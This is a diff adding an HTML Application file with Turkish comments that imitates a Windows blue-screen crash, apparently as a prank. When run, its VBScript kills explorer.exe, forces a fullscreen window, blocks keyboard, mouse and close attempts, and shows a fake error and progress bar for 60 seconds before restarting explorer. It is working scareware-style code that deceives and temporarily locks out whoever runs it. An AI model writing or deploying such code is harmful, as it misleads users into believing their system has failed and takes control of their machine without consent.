@@ -1,0 +1,272 @@
+<html>
+<head>
+<title>BSOD</title>
+<HTA:APPLICATION
+    ID="BSOD"
+    APPLICATIONNAME="BSOD"
+    BORDER="none"
+    BORDERSTYLE="none"
+    CAPTION="no"
+    CONTEXTMENU="no"
+    INNERBORDER="no"
+    MAXIMIZEBUTTON="no"
+    MINIMIZEBUTTON="no"
+    NAVIGABLE="no"
+    SCROLL="no"
+    SELECTION="no"
+    SHOWINTASKBAR="no"
+    SINGLEINSTANCE="yes"
+    SYSMENU="no"
+    WINDOWSTATE="maximize"
+/>
+<style>
+    body {
+        background-color: #0078d7;
+        color: white;
+        font-family: "Segoe UI", Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        overflow: hidden;
+        cursor: none;
+        width: 100%;
+        height: 100vh;
+        user-select: none;
+        -webkit-user-select: none;
+        -moz-user-select: none;
+        -ms-user-select: none;
+    }
+    .content {
+        padding: 50px 50px;
+        box-sizing: border-box;
+    }
+    .emoji {
+        font-size: 130px;
+        margin-bottom: 40px;
+        text-align: left;
+        font-weight: 100;
+    }
+    .heading {
+        font-size: 36px;
+        margin-bottom: 30px;
+        font-weight: 300;
+        line-height: 1.2;
+    }
+    .text {
+        font-size: 20px;
+        margin-bottom: 50px;
+        line-height: 1.6;
+        max-width: 800px;
+    }
+    .progress {
+        margin: 60px 0;
+        max-width: 600px;
+    }
+    .percent {
+        margin-bottom: 15px;
+    }
+    .bar {
+        height: 20px;
+        background-color: rgba(255,255,255,0.2);
+        position: relative;
+    }
+    .fill {
+        height: 100%;
+        width: 0%;
+        background-color: white;
+        position: absolute;
+    }
+    .info {
+        display: flex;
+        align-items: flex-start;
+        margin-top: 60px;
+    }
+    .details {
+        max-width: 600px;
+    }
+    .code {
+        font-family: Consolas, monospace;
+        margin-top: 20px;
+        font-size: 16px;
+    }
+    #timer {
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        font-size: 16px;
+        opacity: 0.5;
+        display: none;
+    }
+    a {
+        color: white;
+        text-decoration: none;
+    }
+</style>
+</head>
+<body>
+<div class="content">
+    <div class="emoji">:(</div>
+    <div class="heading">Your PC ran into a problem and needs to restart.</div>
+    <div class="text">
+        We're just collecting some error info, and then we'll restart for you.<br>
+        (<span id="percentInText">0</span>% complete)
+    </div>
+    <div class="progress">
+        <div class="percent" id="percentText">0% complete</div>
+        <div class="bar"><div class="fill" id="progressBar"></div></div>
+    </div>
+    <div class="info">
+        </div>
+        <div class="details">
+            For more information about this issue and possible fixes, visit<br>
+            <a href="https://www.windows.com/stopcode" target="_blank">https://www.windows.com/stopcode</a><br><br>
+            If you call a support person, give them this info:<br>
+            <div class="code">Stop code: <span id="stopCode">CRITICAL_PROCESS_DIED</span><br>
+            Error code: <span id="errorCode">0x00000EF</span></div>
+        </div>
+    </div>
+    <div id="timer">60</div>
+</div>
+
+<script language="VBScript">
+Option Explicit
+Dim duration, startTime, isRunning, wshShell
+
+' Ana BSOD konfigürasyonu
+duration = 60 ' 60 saniye = 1 dakika
+startTime = Now
+isRunning = True
+Set wshShell = CreateObject("WScript.Shell")
+
+' Ana pencerenin yüklenme olayı
+Sub window_onload()
+    ' Generate random error codes
+    Dim stopCodes, errorCodes, randomIndex
+    stopCodes = Array("CRITICAL_PROCESS_DIED", "SYSTEM_THREAD_EXCEPTION", "MEMORY_MANAGEMENT", "IRQL_NOT_LESS_OR_EQUAL")
+    errorCodes = Array("0x00000EF", "0x0000007E", "0x0000001A", "0x0000000A")
+    
+    Randomize
+    randomIndex = Int(UBound(stopCodes) * Rnd)
+    
+    document.getElementById("stopCode").innerText = stopCodes(randomIndex)
+    document.getElementById("errorCode").innerText = errorCodes(randomIndex)
+    
+    ' Tam ekran
+    window.moveTo 0, 0
+    window.resizeTo screen.Width, screen.Height
+    
+    ' Explorer.exe'yi kapat
+    wshShell.Run "taskkill /f /im explorer.exe", 0, True
+    
+    ' Klavye, mouse ve sağ tıklama engelleme
+    document.onkeydown = GetRef("BlockKeys")
+    document.onkeyup = GetRef("BlockKeys")
+    document.oncontextmenu = GetRef("ReturnFalse")
+    document.onmousedown = GetRef("ReturnFalse")
+    document.onmouseup = GetRef("ReturnFalse")
+    document.onmousemove = GetRef("ReturnFalse")
+    document.onselectstart = GetRef("ReturnFalse")
+    document.ondragstart = GetRef("ReturnFalse")
+    
+    ' İlerleme çubuğu güncelleyiciyi başlat
+    window.setTimeout "UpdateProgress", 1000
+End Sub
+
+' İlerleme çubuğu güncelleme
+Sub UpdateProgress()
+    If Not isRunning Then
+        Exit Sub
+    End If
+    
+    Dim elapsed, percent, secondsLeft
+    elapsed = DateDiff("s", startTime, Now)
+    
+    If elapsed >= duration Then
+        isRunning = False
+        ' Explorer.exe'yi yeniden başlat
+        wshShell.Run "explorer.exe", 0, False
+        window.close()
+        Exit Sub
+    End If
+    
+    percent = Int((elapsed / duration) * 100)
+    secondsLeft = duration - elapsed
+    
+    ' DOM elemanlarını güncelle
+    document.getElementById("progressBar").style.width = percent & "%"
+    document.getElementById("percentText").innerText = percent & "% complete"
+    document.getElementById("percentInText").innerText = percent
+    document.getElementById("timer").innerText = secondsLeft
+    
+    ' Recursive çağrı ile güncellemelere devam et
+    window.setTimeout "UpdateProgress", 1000
+End Sub
+
+' Tuşları engelleme
+Function BlockKeys()
+    ' Windows tuşu (91 = Sol Windows, 92 = Sağ Windows)
+    If window.event.keyCode = 91 Or window.event.keyCode = 92 Then
+        window.event.returnValue = False
+        window.event.keyCode = 0
+        BlockKeys = False
+        Exit Function
+    End If
+    
+    ' F4 tuşunu engelle
+    If window.event.keyCode = 115 Then
+        window.event.returnValue = False
+        window.event.keyCode = 0
+        BlockKeys = False
+        Exit Function
+    End If
+    
+    ' Delete tuşunu engelle
+    If window.event.keyCode = 46 Then
+        window.event.returnValue = False
+        window.event.keyCode = 0
+        BlockKeys = False
+        Exit Function
+    End If
+    
+    ' Alt+F4, Ctrl+Alt+Delete ve diğer özel tuş kombinasyonlarını engelle
+    If window.event.altKey Or window.event.ctrlKey Or window.event.shiftKey Then
+        window.event.returnValue = False
+        window.event.keyCode = 0
+        BlockKeys = False
+        Exit Function
+    End If
+    
+    ' Tüm tuşları engelle
+    window.event.returnValue = False
+    window.event.keyCode = 0
+    BlockKeys = False
+End Function
+
+' False döndürme yardımcı fonksiyonu
+Function ReturnFalse()
+    ReturnFalse = False
+End Function
+
+' Yeniden boyutlandırmayı engelle
+Sub window_onresize()
+    window.moveTo 0, 0
+    window.resizeTo screen.Width, screen.Height
+End Sub
+
+' Pencere odağını kaybettiğinde tekrar odaklan
+Sub window_onblur()
+    window.focus()
+End Sub
+
+' Pencere kapatılmaya çalışıldığında engelle
+Sub window_onbeforeunload()
+    If isRunning Then
+        window.event.returnValue = False
+        window.event.cancelBubble = True
+    Else
+        ' Eğer süre dolduysa, explorer.exe'nin başlatıldığından emin ol
+        wshShell.Run "C:\Windows\explorer.exe", 0, False
+    End If
+End Sub
+</script>
+</body>
+</html>
